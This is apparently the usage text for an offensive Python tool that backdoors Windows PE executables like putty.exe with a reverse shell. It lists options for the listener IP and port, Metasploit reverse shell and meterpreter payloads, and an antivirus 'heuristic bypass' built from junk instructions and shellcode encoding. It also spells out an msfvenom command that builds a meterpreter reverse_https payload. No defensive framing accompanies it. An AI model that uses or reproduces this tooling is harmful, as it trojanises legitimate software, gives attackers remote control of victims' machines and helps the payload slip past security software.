My implementation of automatically adding a backdoor shell to a PE file.

    Usage: usage python addShell.py [OPTIONS]
    Example: python addShell.py -f ./putty.exe -H 192.168.1.10 -P 443 -p 3 

    Options:
      -h, --help        show this help message and exit
      -f FILE           Specify input PE file to backdoor
      -o OUTPUT         Specify output location to save backdoored file.
                          Default=inputFile_evil.exe
      -H HOSTIP         Specify IP Address of listening Host for reverse connection, ex: 192.168.1.10
      -P PORT           Specify listening port number, ex: 4321
      -s SHELLCODE      Specify custom shellcode to use, NOTE: this feature in backdoor mode adds 310 bytes to shellcode size
                          NOTE: must be in "feedbeef" hex format, recommend using the following command to properly format shellcode:
                          msfvenom -p windows/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 -f raw | xxd -p | tr -d " "
      -p PAYLOAD        Specify payload.  Default shell_reverse_tcp.  Valid values are:
                          0 - windows/shell_reverse_tcp
                          1 - windows/meterpreter/reverse_http
                          2 - windows/meterpreter/reverse_http +PrependMigrate
                          3 - windows/meterpreter/reverse_https
                          4 - windows/meterpreter/reverse_https +PrependMigrate
      -m MODE           Specify program mode.  Program was designed to backdoor executables, but if you really need to, you can disable normal program execution with the FRONTDOOR mode.
                          Valid values are (Default 0):
                          0 - BACKDOOR
                          1 - FRONTDOOR
      -t TARGETOS       Specify the target Operating System (used for preserving ESP).  Default Win7_64bit.  Valid values are:
                          0 - Win7_32bit
                          1 - Win7_64bit
                          2 - Win8.1_64bit
                          3 - Win10_64bit
      -d OFFSET         Specify the offset distance between shellcode and start of cave.  Recommend increasing this value if PE is crashing after shell. 
                          Default: 4
      -j NUM_JUNK       Specify the number of "Junk" Instructions to use in heuristic bypass routine.  
                          Default 30
      -J NUM_JUNK_ITER  Specify the number of times to iterate over all "Junk" Instructions used in heuristic bypass routine.
                          Default 20,000,000
      -e NUM_ENCODE     Specify number of random operations used to encode the shellcode. 
                          Default: 10, Max: 40
